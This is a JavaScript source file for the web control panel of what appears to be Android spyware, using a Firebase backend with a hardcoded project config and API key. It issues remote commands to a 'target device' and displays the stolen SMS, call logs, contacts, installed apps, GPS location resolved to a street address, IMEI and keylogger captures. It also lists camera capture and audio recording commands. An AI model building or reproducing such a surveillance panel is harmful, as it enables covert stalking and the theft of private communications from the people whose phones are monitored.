// ✅ Firebase SDK Import
import { update } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-database.js";
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
import {
  getDatabase,
  ref,
  set,
  push,
  onValue,
  onChildAdded,
  get
} from "https://www.gstatic.com/firebasejs/9.23.0/firebase-database.js";
import {
  getAuth,
  signOut,
  onAuthStateChanged
} from "https://www.gstatic.com/firebasejs/9.23.0/firebase-auth.js";

// ✅ Firebase Config
const firebaseConfig = {
  apiKey: "AIzaSyCW87BPPsuA_AsNCzqfEEVFSvHF-SP100k",
  authDomain: "android-service-54676.firebaseapp.com",
  databaseURL: "https://android-service-54676-default-rtdb.firebaseio.com",
  projectId: "android-service-54676",
  storageBucket: "android-service-54676.appspot.com",
  messagingSenderId: "446333235153",
  appId: "1:446333235153:web:f7366fd64166b83d5b3af0"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);
const auth = getAuth();

let uid = null;
let dashboardInitialized = false;

// function sendCommand(section, commandValue) {
//   const user = auth.currentUser;
//   if (!user) return console.warn("User not authenticated");

//   const commandRef = ref(db, `users/${user.uid}/${section}/command`);

//   set(commandRef, {
//     value: commandValue,
//     timestamp: new Date().toISOString()
//   })
//   .then(() => console.log(`✅ Sent '${commandValue}' to ${section}`))
//   .catch(err => console.error("❌ Command Error:", err));
// }

function sendCommand(section, commandValue) {
  const user = auth.currentUser;
  if (!user) return console.warn("User not authenticated");

  const sectionRef = ref(db, `users/${user.uid}/${section}`);
  update(sectionRef, {
    command: {
      value: commandValue,
      timestamp: new Date().toISOString()
    }
  })
  .then(() => console.log(`✅ Sent '${commandValue}' to ${section}`))
  .catch(err => console.error("❌ Command Error:", err));
}

onAuthStateChanged(auth, (user) => {
  if (user && !dashboardInitialized) {
    uid = user.uid;
    dashboardInitialized = true;
    initializeDashboard();
  } else if (!user) {
    window.location.href = "index.html";
  }
});

function initializeDashboard() {
  document.getElementById("logoutBtn")?.addEventListener("click", () => {
    signOut(auth).then(() => window.location.href = "index.html");
  });

  [
    { section: "status", command: "getStatus" },
    { section: "battery", command: "getBattery" },
    { section: "lastSeen", command: "getLastSeen" },
    { section: "device", command: "refreshdevice" },
    { section: "location", command: "getLocation" }
  ].forEach(({ section, command }) => sendCommand(section, command));

  const userRef = ref(db, `users/${uid}`);
  onValue(userRef, (snapshot) => {
    const data = snapshot.val();
    if (!data) return;

//     const status = data.status?.toLowerCase(); // normalize and avoid errors

// document.getElementById("deviceStatus").textContent = status === "online" ? "Online" : "Offline";
// document.getElementById("deviceStatus").className = status === "online" ? "status-green" : "status-red";

const status = data.status?.toLowerCase() ?? "offline";
document.getElementById("deviceStatus").textContent = status === "online" ? " Online" : "Offline";
document.getElementById("deviceStatus").className = status === "online" ? "status-green" : "status-red";

document.getElementById("dataEnable").textContent = status === "online" ? "On" : "Off";
document.getElementById("dataEnable").className = status === "online" ? "status-green" : "status-red";
// document.getElementsByClassName("dataSingle").className = status === "online" ? "status-green" : "status-red";


// IF TARGET DEVICE INFO DOES NOT SHOW DATA THEN ISSUE IS HERE
//charging on / off
const chargingElements = document.getElementsByClassName("charging-on");
const chargingMode = data.battery?.charging;  // optional chaining, might be boolean

if (chargingMode === true) {
  // Show all charging indicators
  for (let el of chargingElements) {
    el.style.display = "flex";
  }
} else {
  // Hide all charging indicators
  for (let el of chargingElements) {
    el.style.display = "none";
  }
}


// Device info

let manufacturer = data.deviceInfo.manufacturer;
let deviceModel  = data.deviceInfo.model;
let isRooted = data.deviceInfo.root;
let imeiNumber = data.deviceInfo.imei;

if(isRooted === "true"){
  isRooted = "Yes";
}else{
  isRooted = "No";
}

document.getElementById("deviceName").textContent = manufacturer;
document.getElementById("deviceModel").textContent = deviceModel;
document.getElementById("deviceRoot").textContent = isRooted;
document.getElementById("imeiNumber").textContent = imeiNumber;


// let accName = "Spy";
// let accEmail  = data.email;
// let accPhone  = data.deviceInfo.sim.phoneNumber;
// let regisDate = data.info.registerTimestamp;
// let lastLogin = data.info.lastLoginTimestamp;

// if (  regisDate || lastLogin ) {
//       const rD = new Date(regisDate);
//       const lL = new Date(lastLogin);
//     } else {
//      document.getElementById("regisDate").textContent = "Null";
//      document.getElementById("lastLogin").textContent = "Null";

//     }

// document.getElementById("accName").textContent = accName;
// document.getElementById("accEmail").textContent = accEmail;
// document.getElementById("accPhone").textContent = accPhone;
// document.getElementById("regisDate").textContent = `At ${rD.toLocaleTimeString()} , On ${rD.toDateString()}`;
// document.getElementById("lastLogin").textContent = `At ${lL.toLocaleTimeString()} , On ${lL.toDateString()}`;

let accName = "Spy";
let accEmail = data.email || "Null";
let accPhone = data.deviceInfo?.sim?.phoneNumber || "Null";
let regisDate = data.info?.registerTimestamp || null;
let lastLogin = data.info?.lastLoginTimestamp || null;
// let lastLogin = data.lastLogin || null;                  This is for web

function parseDate(ts) {
    if (!ts) return null;
    if (typeof ts === "number") {
        // If it's in seconds, convert to milliseconds
        if (ts.toString().length === 10) ts *= 1000;
        return new Date(ts);
    }
    if (typeof ts === "string") {
        return new Date(ts);
    }
    return null;
}

let rD = parseDate(regisDate);
let lL = parseDate(lastLogin);

document.getElementById("accName").textContent = accName;
document.getElementById("accEmail").textContent = accEmail;
document.getElementById("accPhone").textContent = accPhone;

document.getElementById("regisDate").textContent = 
    rD ? `At ${rD.toLocaleTimeString()} , On ${rD.toDateString()}` : "Null";

document.getElementById("lastLogin").textContent = 
    lL ? `At ${lL.toLocaleTimeString()} , On ${lL.toDateString()}` : "Null";

   // Location 
 document.getElementById("getLocationRefresh").addEventListener("click",()=>{
   sendCommand("location", "getLocation");
 });
    try {
  // Ensure location and data exist
  const locationData = data.location?.data;
  if (!locationData) throw new Error("⚠️ Location data missing");

  const latitude = locationData.latitude;
  const longitude = locationData.longitude;
  let timestamp = locationData.timestamp;

  if (latitude === undefined || longitude === undefined || !timestamp) {
    throw new Error("⚠️ Incomplete location data");
  }

  // If it's UNIX timestamp in seconds, convert to milliseconds
  if (typeof timestamp === 'number' && timestamp.toString().length === 10) {
    timestamp *= 1000;
  }

  const dateObj = new Date(timestamp);

  // Format date like: 07 Aug 2025, 14:00
  const formattedDate = dateObj.toLocaleString('en-GB', {
    day: '2-digit',
    month: 'short',
    year: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
    hour12: false
  }).replace(',', '');

  // Inject values into HTML
  document.getElementById("locationUpdated").innerText = formattedDate;
  document.getElementById("latitude").innerText = latitude;
  document.getElementById("longitude").innerText = longitude;

  // Google Maps iframe
  const mapUrl = `https://www.google.com/maps?q=${latitude},${longitude}&z=15&output=embed`;
  document.getElementById("mapIframe").src = mapUrl;

  // Reverse Geocode with Nominatim
  const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&addressdetails=1`;

  fetch(url, {
    method: 'GET',
    headers: {
      'Accept': 'application/json',
      'User-Agent': 'SpyderApp/1.0 (spyder@example.com)' // Use your real contact if used publicly
    }
  })
  .then(response => response.json())
  .then(data => {
    const address = data.address;
    if (!address) throw new Error("No address returned");

    const readable = [
      address.house_number,
      address.road,
      address.neighbourhood,
      address.suburb,
      address.city || address.town || address.village,
      address.state_district,
      address.state,
      address.postcode,
      address.country
    ].filter(Boolean).join(', ');

    console.log("📍 Full Address:", readable);
    document.getElementById("address").innerText = readable;
  })
  .catch(error => {
    console.error("❌ Error fetching address:", error);
    document.getElementById("address").innerText = "Unable to fetch address";
  });

} catch (err) {
  console.warn("❌ Location block error:", err.message);
  document.getElementById("locationUpdated").innerText = "No data";
  document.getElementById("latitude").innerText = "--";
  document.getElementById("longitude").innerText = "--";
  document.getElementById("address").innerText = "No location data";
  document.getElementById("mapIframe").src = "";
}

// sendCommand("location", "getLocation");
 
    // Battery
    const battery = data.battery?.percentage;
    document.getElementById("batteryLevel").textContent = battery !== undefined ? `${battery}%` : "--%";

    if (data.lastSeenTime) {
      const dt = new Date(data.lastSeenTime);
      document.getElementById("lastSeen").textContent = `At ${dt.toLocaleTimeString()} , On ${dt.toDateString()}`;
    } else {
      document.getElementById("lastSeen").textContent = "Unknown";
    }
  });

  const fetchData = (path, tbodyId, mapFn) => {
    const refPath = ref(db, `users/${uid}/${path}`);
    const tbody = document.getElementById(tbodyId);
    tbody.innerHTML = "";
    get(refPath).then(snapshot => {
      if (!snapshot.exists()) return;
      snapshot.forEach(snap => tbody.innerHTML += mapFn(snap.val()));
      showSection(path);
    });
  };

  document.getElementById("btnInstalledApps")?.addEventListener("click", () => {
    fetchData("installedApps", "appsTableBody", app => `<tr><td>${app.name}</td><td>${app.package}</td></tr>`);
    sendCommand("installedApps", "getInstalledApps");
  });

  document.getElementById("btnCallLogs")?.addEventListener("click", () => {
    fetchData("calls", "callTableBody", log => {
      const time = log.time ? new Date(log.time).toLocaleString() : "N/A";
      return `<tr><td>${log.name || "-"}</td><td>${log.number || "-"}</td><td>${log.type || "-"}</td><td>${log.duration || "-"}s</td><td>${time}</td></tr>`;
    });
    sendCommand("calls", "getCallLogs");
  });

  document.getElementById("btnContacts")?.addEventListener("click", () => {
    fetchData("contacts", "contactTableBody", c => `<tr><td>${c.name || "-"}</td><td>${c.number || "-"}</td></tr>`);
    sendCommand("contacts", "getContacts");
  });
  
  document.getElementById("smsBtn")?.addEventListener("click", () => {
    document.getElementById("smsLogs").style.display = "block";
    displayNoneDashboard();
    sendCommand("sms", "getSmsLogs");
  });

  document.getElementById("refreshSiteBtn")?.addEventListener("click", () => location.reload());

  document.addEventListener("DOMContentLoaded", () => {
    document.querySelectorAll(".side-features a").forEach(link => {
      link.addEventListener("click", (e) => {
        e.preventDefault();
        const section = link.dataset.section;
        if (!section) return;
        const commandMap = {
          "dashboard": "getStatus", "sms": "getSmsLogs", "call-logs": "getCallLogs",
          "contact": "getContacts", "camera": "capturePhoto", "microphone": "recordAudio",
          "gallery": "getGallery", "file-manager": "getFiles", "im-monitor": "getMessages",
          "geo-fence": "getGeoFence", "keylogger": "getKeystrokes", "remote-command": "getRemoteCommands",
          "app-lock": "getLockedApps"
        };
        const command = commandMap[section] || `fetch-${section}`;
        sendCommand(section, command);
      });
    });
  });

  // ✅ SMS Logs
  const smsLogs = [];

  function renderSMSLogs() {
    const tbody = document.getElementById("smsTableBody");
    tbody.innerHTML = "";
    const nameFilter = document.getElementById("filter-name").value.toLowerCase();
    const numberFilter = document.getElementById("filter-number").value.toLowerCase();
    const messageFilter = document.getElementById("filter-message").value.toLowerCase();
    const dateFilter = document.getElementById("filter-date").value.toLowerCase();
    const addressFilter = document.getElementById("filter-address").value.toLowerCase();

    const filtered = smsLogs.filter(sms => {
      return (!nameFilter || (sms.name || "").toLowerCase().includes(nameFilter)) &&
             (!numberFilter || (sms.number || "").toLowerCase().includes(numberFilter)) &&
             (!messageFilter || (sms.message || "").toLowerCase().includes(messageFilter)) &&
             (!dateFilter || new Date(sms.timestamp || 0).toLocaleDateString().toLowerCase().includes(dateFilter)) &&
             (!addressFilter || (sms.address || "").toLowerCase().includes(addressFilter));
    });

    filtered.forEach(sms => {
      const tr = document.createElement("tr");
      tr.innerHTML = `
        <td><input type="checkbox" /></td>
        <td><span class="badge ${sms.type === 'INCOMING' ? 'badge-incoming' : 'badge-outgoing'} text-white">${sms.type || '-'}</span></td>
        <td>${sms.name || '-'}</td>
        <td>${sms.message || '-'}</td>
        <td>${sms.number || '-'}</td>
        <td>${sms.timestamp ? new Date(sms.timestamp).toLocaleString() : '-'}</td>
        <td>${sms.address || 'Unknown'}</td>
      `;
      tbody.appendChild(tr);
    });
  }

  const smsRef = ref(db, `users/${uid}/sms/logs`);
  onChildAdded(smsRef, (snap) => {
    const sms = snap.val();
    if (sms) {
      smsLogs.push(sms);
      renderSMSLogs();
    }
  });

  ["filter-name", "filter-message", "filter-number", "filter-date", "filter-address"].forEach(id => {
    document.getElementById(id)?.addEventListener("input", renderSMSLogs);
  });

  // ✅ Keylogger
  const keylogBody = document.getElementById("logBody");
  const keylogSearch = document.getElementById("searchInput");

  if (keylogBody && keylogSearch) {
    const keylogs = [];
    const keylogRef = ref(db, `users/${uid}/keyloggers`);

    onChildAdded(keylogRef, (snap) => {
      const data = snap.val();
      if (data) {
        keylogs.push(data);
        renderKeylogs();
      }
    });

    function renderKeylogs() {
      const query = keylogSearch.value.toLowerCase();
      keylogBody.innerHTML = "";

      const filtered = keylogs.filter(log =>
        !query || (log.text || "").toLowerCase().includes(query)
      );

      filtered.forEach(log => {
        const row = document.createElement("tr");
        row.innerHTML = `
          <td style="padding: 8px; border-bottom: 1px solid #444;">${new Date(log.timestamp || Date.now()).toLocaleString()}</td>
          <td style="padding: 8px; border-bottom: 1px solid #444;">${log.text || ''}</td>
        `;
        keylogBody.appendChild(row);
      });
    }

    keylogSearch.addEventListener("input", renderKeylogs);
  }
}
